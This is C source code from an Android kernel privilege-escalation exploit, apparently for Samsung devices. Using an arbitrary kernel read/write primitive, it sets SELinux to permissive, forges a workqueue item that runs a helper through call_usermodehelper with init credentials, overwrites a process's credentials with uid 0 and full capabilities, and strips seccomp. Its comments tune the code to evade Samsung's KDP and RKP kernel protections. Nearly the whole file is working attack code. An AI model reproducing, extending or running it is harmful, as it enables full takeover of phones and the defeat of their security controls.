#include "common.h"
#include "runtime_struct_offsets.h"
#include <sys/un.h>

#define DEFAULT_ROOT_HELPER_PATH "/data/local/tmp/ghostlock-helper"

static const char *select_root_helper_path(void) {
  const char *from_app = getenv("GHOSTLOCK_HELPER_PATH");
  if (from_app && from_app[0] && access(from_app, X_OK) == 0) {
    return from_app;
  }
  if (access(DEFAULT_ROOT_HELPER_PATH, X_OK) == 0) {
    return DEFAULT_ROOT_HELPER_PATH;
  }
  if (from_app && from_app[0]) {
    return from_app;
  }
  return DEFAULT_ROOT_HELPER_PATH;
}

/* Workqueue-UMH root stage for KDP_CRED devices (Samsung): instead of
 * rewriting a task's cred (KDP panics on that), forge a work item into
 * system_unbound_wq whose func is call_usermodehelper_exec_work; the
 * kernel runs the helper with init creds.  Layout/offsets replicated from
 * the calibrated Samsung payload flow. */

struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  /* The stable shell UMH path passes the generated script as its argument.
   * Keep the stable scratch layout: changing this field to a compact helper
   * layout changes every following pointer and regresses the
   * Fold6 immediately after completion.done became 1. */
  char arg[320];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

_Static_assert(sizeof(struct umh_subprocess_info) == 112,
               "subprocess_info layout");
_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");
_Static_assert(offsetof(struct umh_kernel_data, path) == 32,
               "umh path layout");
_Static_assert(sizeof(struct umh_kernel_data) == 0x298,
               "umh data layout");
_Static_assert(offsetof(struct umh_kernel_data, argv) == 0x270,
               "umh argv layout");

static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 ||
      unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }

  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_close = close(master_fd);
  int slave_close = close(slave_fd);
  return master_close == 0 && slave_close == 0;
}

/* The CFI stage establishes the configfs primitive, then the UMH stage uses
 * the pipe-backed physical R/W path for direct-map objects.  This is the
 * path used for slab-resident workqueue objects; configfs alone can
 * read the .data pointer but reboots when it dereferences the returned pwq. */
static uint64_t umh_read64(int fd, uintptr_t addr) {
  return kernel_read64(fd, addr);
}

static uint32_t umh_read32(int fd, uintptr_t addr) {
  return (uint32_t)kernel_read64(fd, addr);
}

static int umh_write(int fd, uintptr_t addr, const void *data, size_t len) {
  return kernel_write_data(fd, addr, data, len) == (ssize_t)len;
}

/* Keep the UMH workqueue probe separate from the older root helpers below.
 * The calibrated payload rejects non-direct-map targets before touching
 * the arbitrary R/W primitive.  Its scalar helper keeps an eight-byte
 * transfer width and truncates when the caller needs a 32-bit field.  Log
 * the syscall result as well: a missing "end" marker means the target access
 * itself killed/restarted the kernel. */
static int umh_target_ok(uintptr_t addr, size_t len, const char *tag) {
  if (len == 0 || !is_direct_ptr(addr) ||
      len - 1 > UINTPTR_MAX - addr ||
      !is_direct_ptr(addr + len - 1)) {
    pr_error("root umh invalid target tag=%s addr=%016zx len=%zu\n",
             tag, addr, len);
    return 0;
  }
  return 1;
}

static int umh_read64_checked(int fd, uintptr_t addr, const char *tag,
                              uint64_t *out, int trace) {
  if (out == NULL) {
    pr_error("root umh read64 missing output tag=%s addr=%016zx\n",
             tag, addr);
    return 0;
  }
  *out = 0;
  if (!umh_target_ok(addr, sizeof(*out), tag)) {
    return 0;
  }
  if (trace) {
    pr_info("root umh read64 begin tag=%s addr=%016zx\n", tag, addr);
  }
  errno = 0;
  int ok = pipe_phys_read_data(fd, addr, out, sizeof(*out));
  ssize_t n = ok ? (ssize_t)sizeof(*out) : -1;
  int read_errno = errno;
  if (trace || n != (ssize_t)sizeof(*out)) {
    pr_info("root umh read64 end tag=%s addr=%016zx ret=%zd value=%016llx "
            "errno=%d\n",
            tag, addr, n, (unsigned long long)*out, read_errno);
  }
  if (n != (ssize_t)sizeof(*out)) {
    pr_error("root umh read64 failed tag=%s addr=%016zx ret=%zd errno=%d\n",
             tag, addr, n, read_errno);
    return 0;
  }
  return 1;
}

static int umh_read32_checked(int fd, uintptr_t addr, const char *tag,
                              uint32_t *out, int trace) {
  if (out == NULL) {
    pr_error("root umh read32 missing output tag=%s addr=%016zx\n",
             tag, addr);
    return 0;
  }
  *out = 0;
  uint64_t raw = 0;
  if (!umh_target_ok(addr, sizeof(raw), tag)) {
    return 0;
  }
  if (trace) {
    pr_info("root umh read32 begin tag=%s addr=%016zx\n", tag, addr);
  }
  errno = 0;
  /* A native 4-byte request corrupts the configfs page/position state on
   * this kernel and reboots the device.  Read a qword, then
   * consume its low half for 32-bit fields. */
  int ok = pipe_phys_read_data(fd, addr, &raw, sizeof(raw));
  ssize_t n = ok ? (ssize_t)sizeof(raw) : -1;
  int read_errno = errno;
  *out = (uint32_t)raw;
  if (trace || n != (ssize_t)sizeof(raw)) {
    pr_info("root umh read32 end tag=%s addr=%016zx ret=%zd raw=%016llx "
            "value=%08x errno=%d\n",
            tag, addr, n, (unsigned long long)raw, *out, read_errno);
  }
  if (n != (ssize_t)sizeof(raw)) {
    pr_error("root umh read32 failed tag=%s addr=%016zx ret=%zd errno=%d\n",
             tag, addr, n, read_errno);
    return 0;
  }
  return 1;
}

static int umh_write_checked(int fd, uintptr_t addr, const void *data,
                             size_t len, const char *tag) {
  if (data == NULL || !umh_target_ok(addr, len, tag)) {
    if (data == NULL) {
      pr_error("root umh write missing data tag=%s addr=%016zx len=%zu\n",
               tag, addr, len);
    }
    return 0;
  }
  pr_info("root umh write begin tag=%s addr=%016zx len=%zu\n",
          tag, addr, len);
  errno = 0;
  int ok = pipe_phys_write_data(fd, addr, data, len);
  ssize_t n = ok ? (ssize_t)len : -1;
  int write_errno = errno;
  pr_info("root umh write end tag=%s addr=%016zx len=%zu ret=%zd errno=%d\n",
          tag, addr, len, n, write_errno);
  if (n != (ssize_t)len) {
    pr_error("root umh write failed tag=%s addr=%016zx len=%zu ret=%zd "
             "errno=%d\n",
             tag, addr, len, n, write_errno);
    return 0;
  }
  return 1;
}

int install_workqueue_umh_root(int fd, const char *helper_path,
                               const char *helper_arg) {
  if (last_kernel_page_prepare_attempt <= 0 ||
      last_kernel_page_prepare_attempt > 2) {
    pr_warning("root umh refused: allocator preparation attempt=%d is outside safe window 1..2\n",
               last_kernel_page_prepare_attempt);
    return 0;
  }

  uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  int legacy_4_19 = active_offsets &&
                    active_offsets->umh_subprocess_legacy_4_19;
  size_t completion_size = active_offsets && active_offsets->umh_completion_size
                             ? active_offsets->umh_completion_size
                             : sizeof(struct umh_completion);
  size_t path_off = completion_size;
  size_t arg_off = path_off + 256;
  size_t uid_off = arg_off + 320;
  size_t argv_off = (uid_off + 16 + 7) & ~7ULL;
  size_t envp_off = argv_off + 4 * sizeof(uint64_t);
  size_t umh_data_size = envp_off + sizeof(uint64_t);
  unsigned char umh_data[0x348];
  unsigned char fake[sizeof(struct umh_subprocess_info)];
  if (completion_size < sizeof(struct umh_completion) ||
      umh_data_size > sizeof(umh_data)) {
    pr_error("root umh unsupported data layout completion=%zu total=%zu\n",
             completion_size, umh_data_size);
    return 0;
  }
  memset(umh_data, 0, sizeof(umh_data));
  memset(fake, 0, sizeof(fake));

  /* Permissive first, then immediately queue the work — keep
   * the permissive window as short as possible (RKP scans). */
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
  pr_info("root umh start page=%016zx selinux=%016zx wq_slot=%016zx "
          "work=%016zx data=%016zx\n",
          page_base, selinux_addr, wq_slot, fake_work_addr, umh_data_addr);
  if (!is_direct_ptr(selinux_addr) || !is_direct_ptr(wq_slot) ||
      !is_direct_ptr(fake_work_addr) || !is_direct_ptr(umh_data_addr)) {
    pr_error("root umh invalid staging address selinux=%016zx "
             "wq_slot=%016zx work=%016zx data=%016zx\n",
             selinux_addr, wq_slot, fake_work_addr, umh_data_addr);
    return 0;
  }
  uint8_t permissive = 0;
  int selinux_write = umh_write_checked(
      fd, selinux_addr, &permissive, sizeof(permissive),
      "selinux.enforcing");
  pr_info("root umh selinux write addr=%016zx ok=%d\n",
          selinux_addr, selinux_write);
  if (!selinux_write) {
    pr_error("root umh selinux write failed\n");
    return 0;
  }
  char *umh_path = (char *)umh_data + path_off;
  char *umh_arg = (char *)umh_data + arg_off;
  char *umh_uid = (char *)umh_data + uid_off;
  if (snprintf(umh_path, 256, "%s", helper_path) >= 256) {
    pr_error("root umh helper path too long\n");
    return 0;
  }
  int arg_len = snprintf(umh_arg, 320, "%s", helper_arg);
  if (arg_len < 0 || arg_len >= 320) {
    pr_error("root umh helper argument too long\n");
    return 0;
  }
  snprintf(umh_uid, 16, "%u", getuid());
  uintptr_t completion_addr = umh_data_addr;
  uintptr_t wait_list_addr = completion_addr + 0x10;
  uintptr_t path_addr = umh_data_addr + path_off;
  uintptr_t arg_addr = umh_data_addr + arg_off;
  uintptr_t uid_addr = umh_data_addr + uid_off;
  uintptr_t argv_addr = umh_data_addr + argv_off;
  uintptr_t envp_addr = umh_data_addr + envp_off;
  put64(umh_data, 0x10, wait_list_addr);
  put64(umh_data, 0x18, wait_list_addr);
  put64(umh_data, argv_off + 0x00, path_addr);
  put64(umh_data, argv_off + 0x08, arg_addr);
  /* A direct --umh helper receives the original shell UID as argv[2].  The
   * generated shell script remains a two-entry argv and therefore leaves it
   * NULL. */
  uint64_t argv2 = strcmp(helper_arg, "--umh") == 0 ? uid_addr : 0;
  put64(umh_data, argv_off + 0x10, argv2);
  pr_info("root umh target path=%s arg=%s uid=%s argv2=%016zx\n",
          umh_path, umh_arg, umh_uid, (uintptr_t)argv2);
  pr_info("root umh layout legacy=%d completion=%zu data=%zu offsets=%zx/%zx/%zx/%zx/%zx\n",
          legacy_4_19, completion_size, umh_data_size, path_off, arg_off,
          uid_off, argv_off, envp_off);
  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);

  uint64_t wq_value = 0;
  if (!umh_read64_checked(fd, wq_slot, "system_unbound_wq", &wq_value, 1)) {
    return 0;
  }
  uintptr_t wq = (uintptr_t)wq_value;
  pr_info("root umh read wq slot=%016zx value=%016zx\n", wq_slot, wq);
  if (!is_direct_ptr(wq)) {
    pr_error("root umh invalid workqueue pointer wq=%016zx\n", wq);
    return 0;
  }

  uint64_t pwq_value = 0;
  if (!umh_read64_checked(fd, wq + WQ_DFL_PWQ_OFF, "wq.dfl_pwq",
                          &pwq_value, 1)) {
    return 0;
  }
  uintptr_t pwq = (uintptr_t)pwq_value;
  pr_info("root umh read pwq addr=%016zx value=%016zx\n",
          wq + WQ_DFL_PWQ_OFF, pwq);
  if (!is_direct_ptr(pwq)) {
    pr_error("root umh invalid pwq pointer pwq=%016zx\n", pwq);
    return 0;
  }

  uint64_t pool_value = 0;
  if (!umh_read64_checked(fd, pwq + PWQ_POOL_OFF, "pwq.pool",
                          &pool_value, 1)) {
    return 0;
  }
  uintptr_t pool = (uintptr_t)pool_value;
  pr_info("root umh read pool addr=%016zx value=%016zx\n",
          pwq + PWQ_POOL_OFF, pool);
  if (!is_direct_ptr(pool)) {
    pr_error("root umh invalid pool pointer pool=%016zx\n", pool);
    return 0;
  }

  /* Validate the pwq owner immediately after the
   * pool pointer, before probing worker-pool state. */
  uint64_t pwq_wq_value = 0;
  if (!umh_read64_checked(fd, pwq + PWQ_WQ_OFF, "pwq.wq",
                          &pwq_wq_value, 1)) {
    return 0;
  }
  uintptr_t pwq_wq = (uintptr_t)pwq_wq_value;
  pr_info("root umh read pwq->wq addr=%016zx value=%016zx\n",
          pwq + PWQ_WQ_OFF, pwq_wq);
  if (pwq_wq != wq) {
    pr_error("root umh workqueue owner mismatch wq=%016zx pwq_wq=%016zx\n",
             wq, pwq_wq);
    return 0;
  }

  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0;
  uint64_t list_prev = 0;
  uint32_t nr_idle = 0;
  for (int i = 0; i < 200; i++) {
    if (!umh_read64_checked(fd, worklist, "pool.worklist.next", &list_next,
                            0) ||
        !umh_read64_checked(fd, worklist + sizeof(uint64_t),
                            "pool.worklist.prev", &list_prev, 0) ||
        !umh_read32_checked(fd, pool + POOL_NR_IDLE_OFF, "pool.nr_idle",
                            &nr_idle, 0)) {
      pr_error("root umh pool probe read failed pool=%016zx worklist=%016zx\n",
               pool, worklist);
      return 0;
    }
    if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
      break;
    }
    usleep(1000);
  }
  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
    pr_error("root umh pool busy pool=%016zx list=%016llx/%016llx "
             "head=%016zx idle=%u\n",
             pool, (unsigned long long)list_next,
             (unsigned long long)list_prev, worklist, nr_idle);
    return 0;
  }
  pr_info("root umh pool idle pool=%016zx worklist=%016zx nr_idle=%u\n",
          pool, worklist, nr_idle);

  uint32_t color = 0;
  uint32_t refcnt = 0;
  uint32_t nr_active = 0;
  uint32_t max_active = 0;
  if (!umh_read32_checked(fd, pwq + PWQ_WORK_COLOR_OFF, "pwq.work_color",
                          &color, 1) ||
      !umh_read32_checked(fd, pwq + PWQ_REFCNT_OFF, "pwq.refcnt", &refcnt,
                          1) ||
      !umh_read32_checked(fd, pwq + PWQ_NR_ACTIVE_OFF, "pwq.nr_active",
                          &nr_active, 1) ||
      !umh_read32_checked(fd, pwq + PWQ_MAX_ACTIVE_OFF, "pwq.max_active",
                          &max_active, 1)) {
    return 0;
  }
  pr_info("root umh pwq state color=%u refcnt=%u active=%u/%u\n",
          color, refcnt, nr_active, max_active);
  if (color >= 15 || refcnt == 0 || nr_active >= max_active) {
    pr_error("root umh bad pwq state color=%u refcnt=%u active=%u/%u\n",
             color, refcnt, nr_active, max_active);
    return 0;
  }

  uintptr_t inflight_addr =
      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = 0;
  if (!umh_read32_checked(fd, inflight_addr, "pwq.nr_in_flight", &nr_inflight,
                          1)) {
    return 0;
  }
  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
  size_t complete_off = legacy_4_19 ? 0x20 : 0x30;
  size_t subprocess_path_off = legacy_4_19 ? 0x28 : 0x38;
  size_t subprocess_argv_off = legacy_4_19 ? 0x30 : 0x40;
  size_t subprocess_envp_off = legacy_4_19 ? 0x38 : 0x48;
  size_t subprocess_retval_off = legacy_4_19 ? 0x4c : 0x54;
  put64(fake, WORK_DATA_OFF, work_data);
  put64(fake, WORK_ENTRY_OFF, worklist);
  put64(fake, WORK_ENTRY_OFF + sizeof(uint64_t), worklist);
  put64(fake, WORK_FUNC_OFF, umh_work_func);
  put64(fake, complete_off, completion_addr);
  put64(fake, subprocess_path_off, path_addr);
  put64(fake, subprocess_argv_off, argv_addr);
  put64(fake, subprocess_envp_off, envp_addr);

  uint32_t nr_inflight_want = nr_inflight + 1;
  uint32_t nr_active_want = nr_active + 1;
  uint32_t refcnt_want = refcnt + 1;
  int data_write = umh_write_checked(
      fd, umh_data_addr, umh_data, umh_data_size, "umh.data");
  int work_write = umh_write_checked(
      fd, fake_work_addr, fake, sizeof(fake), "umh.work");
  int counters_write =
      umh_write_checked(fd, inflight_addr, &nr_inflight_want,
                        sizeof(nr_inflight_want), "pwq.nr_in_flight") &&
      umh_write_checked(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active_want,
                        sizeof(nr_active_want), "pwq.nr_active") &&
      umh_write_checked(fd, pwq + PWQ_REFCNT_OFF, &refcnt_want,
                        sizeof(refcnt_want), "pwq.refcnt");
  int list_prev_write = umh_write_checked(
      fd, worklist + sizeof(uint64_t), &fake_entry, sizeof(fake_entry),
      "pool.worklist.prev");
  int list_next_write = list_prev_write && umh_write_checked(
      fd, worklist, &fake_entry, sizeof(fake_entry), "pool.worklist.next");
  pr_info("root umh queued wq=%016zx pwq=%016zx pool=%016zx "
          "work=%016zx entry=%016zx color=%u counters=%u/%u/%u "
          "writes=%d/%d/%d/%d/%d\n",
          wq, pwq, pool, fake_work_addr, fake_entry, color,
          nr_inflight, nr_active, refcnt, data_write, work_write,
          counters_write, list_prev_write, list_next_write);
  if (!data_write || !work_write || !counters_write || !list_next_write) {
    return 0;
  }

  uint32_t complete_done = 0;
  int wake_ok = 0;
  for (int i = 0; i < 8 && !complete_done; i++) {
    wake_ok |= wake_system_unbound();
    for (int j = 0; j < 250; j++) {
      if (!umh_read32_checked(fd, completion_addr, "umh.completion.done",
                              &complete_done, 0)) {
        return 0;
      }
      if (complete_done) {
        break;
      }
      usleep(1000);
    }
  }

  uint32_t retval_value = 0;
  if (!umh_read32_checked(
          fd, fake_work_addr + subprocess_retval_off,
          "umh.subprocess.retval", &retval_value, 1)) {
    return 0;
  }
  int32_t umh_retval = (int32_t)retval_value;
  pr_info("root umh result wake=%d complete=%u retval=%d\n",
          wake_ok, complete_done, umh_retval);
  return complete_done != 0;
}


int root_child_done;
uint8_t selinux_before = 0xff;
uint8_t selinux_after = 0xff;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;
uint64_t capable_head_before;
uint64_t capable_head_after;
uint64_t init_tasks_prev;
uint64_t last_task_guess;
int setgid_ret = -1;
int setuid_ret = -1;
int setenforce_ret = -1;
int setenforce_errno;
uint64_t current_task_addr;
uint64_t current_cred_addr;
uint64_t current_real_cred_addr;
uint64_t current_cred_security_addr;
uint64_t current_real_cred_security_addr;
uint32_t cred_sid_before = 0xffffffff;
uint32_t cred_sid_after = 0xffffffff;
uint32_t real_cred_sid_before = 0xffffffff;
uint32_t real_cred_sid_after = 0xffffffff;
uint32_t target_cred_osid = SELINUX_KERNEL_SID;
uint32_t target_cred_sid = SELINUX_KERNEL_SID;
uint32_t selinux_cred_blob_off = SELINUX_CRED_BLOB_OFF;
int task_walk_iters;
uint64_t task_walk_last_entry;
uint32_t task_walk_last_pid;
uint32_t task_walk_last_tgid;
uint32_t found_task_pid;
uint32_t found_task_tgid;
char found_task_comm[TASK_COMM_LEN + 1];
pid_t root_child_pid = -1;
int root_ready_pipe[2] = {-1, -1};
struct root_shared *root_shared;

int spawn_root_child(void) {
  int prot = PROT_READ | PROT_WRITE;
  int flags = MAP_SHARED | MAP_ANONYMOUS;
  root_shared = SYSCHK(mmap(NULL, sizeof(*root_shared), prot, flags, -1, 0));
  memset(root_shared, 0, sizeof(*root_shared));
  SYSCHK(pipe(root_ready_pipe));

  root_child_pid = SYSCHK(fork());
  if (root_child_pid == 0) {
    close(root_ready_pipe[0]);

    prctl(PR_SET_NAME, "ll_root_child");
    char ready = 1;
    SYSCHK(write(root_ready_pipe[1], &ready, sizeof(ready)));

    for (int i = 0; i < 5000; i++) {
      if (atomic_load(&root_shared->go)) {
        break;
      }
      usleep(1000);
    }
    if (!atomic_load(&root_shared->go)) {
      _exit(2);
    }

    struct root_report report;
    memset(&report, 0, sizeof(report));
    report.uid_before = getuid();
    errno = 0;
    report.setgid_ret = setgid(0);
    report.setgid_errno = errno;
    errno = 0;
    report.setuid_ret = setuid(0);
    report.setuid_errno = errno;
    report.uid_after = getuid();
    report.gid_after = getgid();
    report.euid_after = geteuid();
    report.egid_after = getegid();
    int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
    if (enforce_fd >= 0) {
      ssize_t wrote = write(enforce_fd, "0", 1);
      report.setenforce_ret = wrote == 1 ? 0 : -1;
      report.setenforce_errno = wrote == 1 ? 0 : errno;
      close(enforce_fd);
    } else {
      report.setenforce_ret = -1;
      report.setenforce_errno = errno;
    }
    report.su_daemon_pid = -1;
    report.su_install_ret = 0;
    report.su_install_errno = ENOSYS;
    report.wallpaper_ret = 0;
    report.wallpaper_errno = ENOSYS;
    root_shared->report = report;
    atomic_store(&root_shared->done, 1);

    _exit(report.uid_after == 0 ? 0 : 1);
  }

  close(root_ready_pipe[1]);

  char ready;
  ssize_t got = read(root_ready_pipe[0], &ready, sizeof(ready));
  return got == (ssize_t)sizeof(ready);
}

int collect_root_child(void) {
  if (!root_shared) {
    return 0;
  }
  atomic_store(&root_shared->go, 1);

  for (int i = 0; i < 5000; i++) {
    if (atomic_load(&root_shared->done)) {
      break;
    }
    usleep(1000);
  }
  if (!atomic_load(&root_shared->done)) {
    return 0;
  }

  struct root_report report = root_shared->report;
  root_uid_after = report.uid_after;
  setgid_ret = report.setgid_ret;
  setuid_ret = report.setuid_ret;
  setenforce_ret = report.setenforce_ret;
  setenforce_errno = report.setenforce_errno;
  waitpid(root_child_pid, NULL, 0);
  return report.uid_after == 0 && report.euid_after == 0 &&
         report.gid_after == 0 && report.egid_after == 0;
}

uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
  uint64_t head = data_addr(INIT_TASK_TASKS);
  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
  uint64_t entry = umh_read64(fd, head);
  task_walk_iters = 0;
  task_walk_last_entry = 0;
  task_walk_last_pid = 0;
  task_walk_last_tgid = 0;

  for (int i = 0; i < 4096; i++) {
    task_walk_iters = i + 1;
    task_walk_last_entry = entry;
    if (entry == canonical_head || entry == head) {
      break;
    }
    if (!is_direct_ptr(entry)) {
      break;
    }

    uint64_t task = entry - TASK_TASKS_OFF;
    uint32_t pid = umh_read32(fd, task + TASK_PID_OFF);
    uint32_t tgid = umh_read32(fd, task + TASK_TGID_OFF);
    task_walk_last_pid = pid;
    task_walk_last_tgid = tgid;
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);

    if (tgid == want_tgid || pid == want_tgid) {
      found_task_pid = pid;
      found_task_tgid = tgid;
      memcpy(found_task_comm, comm, sizeof(found_task_comm));
      return task;
    }

    entry = umh_read64(fd, task + TASK_TASKS_OFF);
  }

  return 0;
}

int patch_cred_identity(int fd, uintptr_t cred) {
  if (!is_direct_ptr(cred)) {
    return 0;
  }

  uint64_t zero_ids[4] = {0};
  if (!umh_write(fd, cred + CRED_UID_OFF, zero_ids, sizeof(zero_ids))) {
    return 0;
  }

  uint32_t securebits = 0;
  if (!umh_write(
      fd, cred + CRED_SECUREBITS_OFF, &securebits, sizeof(securebits))) {
    return 0;
  }

  uint64_t caps[CRED_CAP_WORDS] = {
    CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
  };
  if (!umh_write(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {
    return 0;
  }

  uint64_t caps_after[CRED_CAP_WORDS] = {0};
  if (!pipe_phys_read_data(
      fd, cred + CRED_CAPS_OFF, caps_after, sizeof(caps_after))) {
    return 0;
  }
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    if (caps_after[i] != CAP_FULL) {
      pr_info("root cap verify failed cred=%016llx idx=%zu got=%016llx want=%016llx\n",
              (unsigned long long)cred, i, (unsigned long long)caps_after[i],
              (unsigned long long)CAP_FULL);
      return 0;
    }
  }

  return 1;
}

int patch_cred_sid(int fd, uintptr_t cred) {
  uint64_t security = umh_read64(fd, cred + CRED_SECURITY_OFF);
  if (!is_direct_ptr(security)) {
    pr_info("root bad cred security cred=%016llx security=%016llx\n",
            (unsigned long long)cred, (unsigned long long)security);
    return 0;
  }

  uint32_t sid_pair[2] = {
    target_cred_osid, target_cred_sid,
  };
  uintptr_t osid_addr =
    security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
  return umh_write(fd, osid_addr, sid_pair, sizeof(sid_pair));
}

int patch_cred_object(int fd, uintptr_t cred) {
  return patch_cred_identity(fd, cred) && patch_cred_sid(fd, cred);
}

static int patch_task_seccomp(int fd, uintptr_t task) {
  if (!is_direct_ptr(task)) {
    return 0;
  }

  uintptr_t flags_addr = task + TASK_THREAD_INFO_FLAGS_OFF;
  uintptr_t atomic_flags_addr = task + TASK_ATOMIC_FLAGS_OFF;
  uintptr_t seccomp_addr = task + TASK_SECCOMP_OFF;

  uint64_t flags_before = umh_read64(fd, flags_addr);
  uint64_t atomic_before = umh_read64(fd, atomic_flags_addr);
  uint32_t mode_before = umh_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_before =
    umh_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_before = umh_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  uint64_t flags_want = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
  uint64_t atomic_want = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
  uint32_t zero32 = 0;
  uint64_t zero64 = 0;

  int ok = 1;
  if (flags_want != flags_before) {
    ok &= pipe_write64(fd, flags_addr, flags_want);
  }
  if (atomic_want != atomic_before) {
    ok &= pipe_write64(fd, atomic_flags_addr, atomic_want);
  }
  ok &= umh_write(
    fd, seccomp_addr + SECCOMP_MODE_OFF, &zero32, sizeof(zero32));
  ok &= umh_write(
    fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF, &zero32, sizeof(zero32));
  ok &= umh_write(
    fd, seccomp_addr + SECCOMP_FILTER_OFF, &zero64, sizeof(zero64));

  uint64_t flags_after = umh_read64(fd, flags_addr);
  uint64_t atomic_after = umh_read64(fd, atomic_flags_addr);
  uint32_t mode_after = umh_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_after = umh_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_after = umh_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  pr_info("root seccomp patched ok=%d flags=%016llx/%016llx "
          "atomic=%016llx/%016llx mode=%u/%u count=%u/%u "
          "filter=%016llx/%016llx\n",
          ok, (unsigned long long)flags_before,
          (unsigned long long)flags_after,
          (unsigned long long)atomic_before,
          (unsigned long long)atomic_after, mode_before, mode_after,
          count_before, count_after, (unsigned long long)filter_before,
          (unsigned long long)filter_after);

  int tif_clear = (flags_after & (1ULL << TIF_SECCOMP_BIT)) == 0;
  int nnp_clear = (atomic_after & (1ULL << PFA_NO_NEW_PRIVS_BIT)) == 0;
  return ok && tif_clear && nnp_clear && mode_after == 0 &&
         count_after == 0 && filter_after == 0;
}

int install_android_root(int fd) {
  if (active_offsets && active_offsets->umh_root) {
    /* Match Root My Galaxy: UMH directly starts the root helper daemon.  The
     * daemon creates temp_su.sock; the shell UID client connects only after
    * this function observes that socket. */
    unlink("/data/local/tmp/temp_su.sock");
    const char *helper_path = select_root_helper_path();
    pr_info("root UMH helper selected path=%s\n", helper_path);
    return install_workqueue_umh_root(
        fd, helper_path, "--umh");
  }
  root_uid_before = getuid();
  if (!spawn_root_child()) {
    pr_info("root spawn failed child=%d\n", root_child_pid);
    return 0;
  }

  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  pipe_phys_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before));
  selinux_cred_blob_off =
    pipe_read32(fd, data_addr(SELINUX_BLOB_SIZES));
  target_cred_osid = SELINUX_KERNEL_SID;
  target_cred_sid = SELINUX_KERNEL_SID;

  init_tasks_prev = pipe_read64(fd, data_addr(INIT_TASK_TASKS) + 8);
  if (!is_direct_ptr(current_task_addr)) {
    current_task_addr = 0;
  }

  if (!is_direct_ptr(init_tasks_prev)) {
    pr_info("root bad init_tasks_prev=%016llx\n",
            (unsigned long long)init_tasks_prev);
    return 0;
  }
  current_task_addr = init_tasks_prev - TASK_TASKS_OFF;
  last_task_guess = current_task_addr;

  found_task_pid = pipe_read32(fd, current_task_addr + TASK_PID_OFF);
  found_task_tgid = pipe_read32(fd, current_task_addr + TASK_TGID_OFF);
  memset(found_task_comm, 0, sizeof(found_task_comm));
  pipe_phys_read_data(
      fd, current_task_addr + TASK_COMM_OFF, found_task_comm, TASK_COMM_LEN);
  if (found_task_tgid != (uint32_t)root_child_pid) {
    current_task_addr = find_task_by_tgid(fd, (uint32_t)root_child_pid);
    if (!is_direct_ptr(current_task_addr)) {
      pr_info("root task walk failed want=%u iters=%d last=%016llx pid=%u tgid=%u\n",
              (uint32_t)root_child_pid, task_walk_iters,
              (unsigned long long)task_walk_last_entry, task_walk_last_pid,
              task_walk_last_tgid);
      return 0;
    }
  }

  uintptr_t real_cred_slot = current_task_addr + TASK_REAL_CRED_OFF;
  current_real_cred_addr = pipe_read64(fd, real_cred_slot);
  current_cred_addr = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
  uintptr_t cred_security_slot = current_cred_addr + CRED_SECURITY_OFF;
  uintptr_t real_security_slot = current_real_cred_addr + CRED_SECURITY_OFF;
  current_cred_security_addr = pipe_read64(fd, cred_security_slot);
  current_real_cred_security_addr = pipe_read64(fd, real_security_slot);
  uintptr_t sid_off = selinux_cred_blob_off + SELINUX_CRED_SID_OFF;
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_before = pipe_read32(fd, sid_addr);
  }
